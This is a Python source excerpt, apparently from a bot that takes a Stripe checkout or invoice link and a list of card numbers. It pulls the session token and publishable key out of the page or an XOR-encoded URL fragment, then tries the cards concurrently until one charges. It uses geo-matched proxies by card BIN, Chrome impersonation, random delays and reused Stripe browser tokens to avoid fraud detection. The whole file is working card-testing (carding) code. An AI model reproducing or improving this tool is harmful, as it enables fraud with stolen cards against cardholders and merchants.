                proxy_data = await ProxyManager.get_random(self.user_id)
                proxies = None
                if proxy_data:
                    auth = f"{proxy_data['username']}:{proxy_data['password']}@" if 'username' in proxy_data else ""
                    proxy_url = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
                    proxies = {"http": proxy_url, "https": proxy_url}
                
                async with cffi_requests.AsyncSession(impersonate="chrome120", proxies=proxies) as s:
                    resp = await s.get(self.url, timeout=8)
                    final_url = str(resp.url) if hasattr(resp, 'url') else self.url
                    html = resp.text
                    
                    cs_token = StripeAPIExtractor.extract_cs_live(final_url, html)
                    pk_key = None
                    
                    # Try hash fragment decode first
                    check_url = final_url if '#' in final_url else self.url
                    hash_idx = check_url.find('#')
                    if hash_idx != -1:
                        import urllib.parse, base64, json as _json
                        decoded = urllib.parse.unquote(check_url[hash_idx+1:])
                        try:
                            raw_bytes = base64.b64decode(decoded + '==')
                            json_str = ''.join(chr(b ^ 5) for b in raw_bytes)
                            data = _json.loads(json_str)
                            pk_key = data.get('apiKey')
                        except: pass
                    if not pk_key:
                        pk_key = StripeAPIExtractor.extract_pk_live(html)
                    
                    if cs_token and pk_key:
                        return {'cs_token': cs_token, 'pk_key': pk_key}
            except Exception:
                continue
        return None

    async def analyze_first(self):
        url_lower = self.url.lower()
        if 'cs_' not in url_lower and 'buy.stripe.com' not in url_lower and 'invoice.stripe.com' not in url_lower and 'billing.stripe.com' not in url_lower:
            if self.update_callback:
                await self.update_callback({"status": "error", "error": "This does not appear to be a valid Stripe link. Need a checkout, buy, or invoice link."})
            return False
            
        if 'invoice.stripe.com' in url_lower:
            if self.update_callback: await self.update_callback({"status": "analyzing", "step": "Fetching Stripe invoice details..."})
            res = await StripeAPIExtractor.fetch_invoice_data(self.user_id, self.url)
            if res.get('success'):
                self.url_info = {
                    'cs_token': res['cs_token'],
                    'pk_key': res['pk_key'],
                    'merchant': res['merchant'],
                    'amount': res['amount'],
                    'raw_amount': res['raw_amount'],
                    'locked_email': res['locked_email']
                }
                return True
            else:
                if self.update_callback:
                    await self.update_callback({"status": "error", "error": f"Failed to extract invoice keys: {res.get('error')}"})
                return False

        # Try extracting CS and PK directly from URL first to bypass network request entirely
        cs_token = StripeAPIExtractor.extract_cs_live(self.url, "")
        pk_key = None
        hash_idx = self.url.find('#')
        if hash_idx != -1:
            import urllib.parse, base64, json
            hash_str = self.url[hash_idx+1:]
            decoded = urllib.parse.unquote(hash_str)
            try:
                raw_bytes = base64.b64decode(decoded + '==')
                json_str = ''.join(chr(b ^ 5) for b in raw_bytes)
                data = json.loads(json_str)
                pk_key = data.get('apiKey')
            except: pass

        if cs_token and pk_key:
            if self.update_callback: await self.update_callback({"status": "analyzing", "step": "Instantly extracted Stripe keys..."})
            self.url_info = {'cs_token': cs_token, 'pk_key': pk_key, 'merchant': 'Unknown', 'amount': None, 'raw_amount': None}
            api_data = await StripeAPIExtractor.fetch_payment_data(self.user_id, cs_token, pk_key)
            if api_data.get('success'):
                self.url_info['amount'] = api_data.get('amount')
                self.url_info['raw_amount'] = api_data.get('raw_amount')
                self.url_info['merchant'] = api_data.get('merchant')
                self.url_info['locked_email'] = api_data.get('locked_email')
                return True
            else:
                err_msg = api_data.get('error') or "Failed to init Stripe session"
                if self.update_callback:
                    await self.update_callback({"status": "error", "error": f"Stripe session inactive: {err_msg}"})
                return False

        for _ in range(3):
            try:
                proxy_data = await ProxyManager.get_random(self.user_id)
                proxies = None
                if proxy_data:
                    auth = f"{proxy_data['username']}:{proxy_data['password']}@" if 'username' in proxy_data else ""
                    proxy_url = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
                    proxies = {"http": proxy_url, "https": proxy_url}
                
                if self.update_callback: await self.update_callback({"status": "analyzing", "step": "Fast-analyzing Stripe endpoint..."})
                
                async with cffi_requests.AsyncSession(impersonate="chrome120", proxies=proxies) as s:
                    resp = await s.get(self.url, timeout=5)
                    html = resp.text
                    
                    cs_token = StripeAPIExtractor.extract_cs_live(self.url, html)
                    
                    pk_key = None
                    hash_idx = self.url.find('#')
                    if hash_idx != -1:
                        import urllib.parse, base64, json
                        hash_str = self.url[hash_idx+1:]
                        decoded = urllib.parse.unquote(hash_str)
                        try:
                            raw_bytes = base64.b64decode(decoded + '==')
                            json_str = ''.join(chr(b ^ 5) for b in raw_bytes)
                            data = json.loads(json_str)
                            pk_key = data.get('apiKey')
                        except: pass
                    if not pk_key:
                        pk_key = StripeAPIExtractor.extract_pk_live(html)
                        
                    self.url_info = {'cs_token': cs_token, 'pk_key': pk_key, 'merchant': 'Unknown', 'amount': None, 'raw_amount': None}
                    
                    if cs_token and pk_key:
                        api_data = await StripeAPIExtractor.fetch_payment_data(self.user_id, cs_token, pk_key)
                        if api_data.get('success'):
                            self.url_info['amount'] = api_data.get('amount')
                            self.url_info['raw_amount'] = api_data.get('raw_amount')
                            self.url_info['merchant'] = api_data.get('merchant')
                            self.url_info['locked_email'] = api_data.get('locked_email')
                            return True
                        else:
                            err_msg = api_data.get('error') or "Failed to init Stripe session"
                            if self.update_callback:
                                await self.update_callback({"status": "error", "error": f"Stripe session inactive: {err_msg}"})
                            return False
            except Exception as e:
                continue
                
        if self.update_callback:
            await self.update_callback({"status": "error", "error": "Failed to analyze Stripe endpoint. Proxies might be dead."})
        return False

    async def _worker(self, queue: asyncio.Queue):
        while self.is_running:
            try:
                card, attempt_num = queue.get_nowait()
            except asyncio.QueueEmpty:
                break
                
            try:
                max_retries = 2
                bin_info = await BINLookup.lookup(card['card'])
                bin_country = bin_info.get('country', '')
                for try_idx in range(max_retries):
                    # --- Fresh session per card for reusable links ---
                    cs_token = self.url_info['cs_token']
                    pk_key = self.url_info['pk_key']
                    raw_amount = self.url_info.get('raw_amount')
                    locked_email = self.url_info.get('locked_email')
                    
                    if self._reusable:
                        async with self._session_lock:
                            fresh = await self._fetch_fresh_session()
                        if fresh:
                            cs_token = fresh['cs_token']
                            pk_key = fresh['pk_key']
                            # Re-fetch payment data for the fresh session to get correct amount
                            try:
                                api_data = await StripeAPIExtractor.fetch_payment_data(self.user_id, cs_token, pk_key)
                                if api_data.get('success'):
                                    raw_amount = api_data.get('raw_amount') or raw_amount
                                    locked_email = api_data.get('locked_email') or locked_email
                            except Exception:
                                pass
                    
                    proxy_data = await ProxyManager.get_geo_matched(self.user_id, bin_country) if bin_country else await ProxyManager.get_random(self.user_id)
                    hitter = StripeAPIHitter(pk_key, cs_token, proxy_data, raw_amount, locked_email)
                    
                    import random
                    await asyncio.sleep(random.uniform(0.05, 0.2))  # Micro-random delay per card attempt  
                    
                    # Reuse session-level stripe tokens — all cards in the batch should carry the same
                    # muid/sid/guid to mimic a real browser's __stripe_mid (1yr) and __stripe_sid (30min)
                    # Refresh tokens only when older than 25 minutes (inside the 30-min sid window)
                    token_age = time.time() - self._stripe_tokens_ts
                    if not self._stripe_tokens or token_age > 1500:  # 1500s = 25 minutes
                        # No cached tokens yet — hit() will generate them fresh on first card
                        session_tokens = None
                    else:
                        session_tokens = self._stripe_tokens
                    
                    result = await hitter.hit(card, attempt_num, self.user_id, cached_stripe_tokens=session_tokens)
                    
                    # Cache the tokens returned from first card hit for reuse by all subsequent cards
                    if not session_tokens and isinstance(result, dict) and result.get('_stripe_tokens'):
                        self._stripe_tokens = result['_stripe_tokens']
                        self._stripe_tokens_ts = time.time()
                    if isinstance(result, dict) and "status" in result and "result" in result:
                        friend_res = result
                        result = {
                            'attempt': attempt_num,
                            'card': card,
                            'success': friend_res.get("status", False),
                            'decline_code': friend_res.get("result", {}).get("status"),
                            'response_time': friend_res.get("result", {}).get("time", 0),
                            'amount': self.url_info.get('amount'),
                            'merchant': self.url_info.get('merchant'),
                            'proxy_raw': proxy_data['raw'] if proxy_data else None,
                            'error': friend_res.get("result", {}).get("message")
                        }
                        if 'final_url' in friend_res:
                            result['final_url'] = friend_res['final_url']
                        elif 'final_url' in friend_res.get('result', {}):
                            result['final_url'] = friend_res['result']['final_url']
                        if 'receipt_url' in friend_res:
                            result['receipt_url'] = friend_res['receipt_url']
                        elif 'receipt_url' in friend_res.get('result', {}):
                            result['receipt_url'] = friend_res['result']['receipt_url']
                    result['amount'] = self.url_info.get('amount')
                    result['merchant'] = self.url_info.get('merchant')
                    
                    err_str = result.get('error', '') or ''
                    decline = result.get('decline_code', '') or ''
                    should_retry = False
                    
                    # Retry on network failures
                    if decline == 'exception':
                        if any(k in err_str for k in ['Timeout', 'ERR_', 'closed', 'refused', 'reset', 'disconnected', 'socket', 'Navigation failed']):
                            should_retry = True
                    
                    # Retry on resource_missing — session was stale, fetch a new one
                    if decline == 'resource_missing' and self._reusable:
                        should_retry = True
                            
                    if should_retry:
                        if try_idx < max_retries - 1:
                            delay = 2.0 * (try_idx + 1)
                            await asyncio.sleep(delay)
                            continue
                    break
                
                # Race-condition guard: if another worker succeeded while we were hitting, discard this failure result.
                if not self.is_running and not result.get('success'):
                    return
                
                self.completed += 1
                if result['success']:
                    self.successes += 1
                    self.is_running = False
                    
                    # Cancel all other workers immediately to stop them
                    current_task = asyncio.current_task()
                    for w in getattr(self, 'workers', []):
                        if w != current_task and not w.done():
                            w.cancel()
                            
                    while not queue.empty():
                        try:
                            queue.get_nowait()
                        except asyncio.QueueEmpty:
                            break
                else:
                    self.fails += 1
                    
                if self.update_callback:
                    await self.update_callback({
                        "status": "progress",
                        "result": result,
                        "completed": self.completed,
                        "total": self.total,
                        "successes": self.successes,
                        "fails": self.fails
                    })
            except asyncio.CancelledError:
                # Worker was cancelled. Clean exit.
                return
            except Exception as e:
                import traceback
                print(f"DEBUG: _worker processing card {card} failed completely: {str(e)}\n{traceback.format_exc()}", flush=True)
                
                # Race-condition guard for exception block too
                if not self.is_running:
                    return
                    
                self.completed += 1
                self.fails += 1
                if self.update_callback:
                    err_res = {'success': False, 'card': card, 'response_time': 0, 'decline_code': 'exception', 'error': f"Internal bot crash: {str(e)}"}
                    await self.update_callback({
                        "status": "progress",
                        "result": err_res,
                        "completed": self.completed,
                        "total": self.total,
                        "successes": self.successes,
                        "fails": self.fails
                    })
            finally:
                queue.task_done()
    
    async def run(self):
        if self.update_callback:
            await self.update_callback({"status": "analyzing", "step": "Extracting Stripe keys and payload..."})
            
        success = await self.analyze_first()
        if not success:
            return
            
        if self.update_callback:
            await self.update_callback({"status": "starting", "url_info": self.url_info})
            
        import asyncio
        queue = asyncio.Queue()
        for idx, card in enumerate(self.cards[:MAX_ATTEMPTS]):
            queue.put_nowait((card, idx+1))
            
        self.workers = []
        for _ in range(min(CONCURRENT_BATCH_SIZE, len(self.cards))):
            task = asyncio.create_task(self._worker(queue))
            self.workers.append(task)
            
        await queue.join()
        
        for w in self.workers:
            if not w.done():
                w.cancel()
            
        if self.update_callback:
            await self.update_callback({"status": "completed", "successes": self.successes, "fails": self.fails})
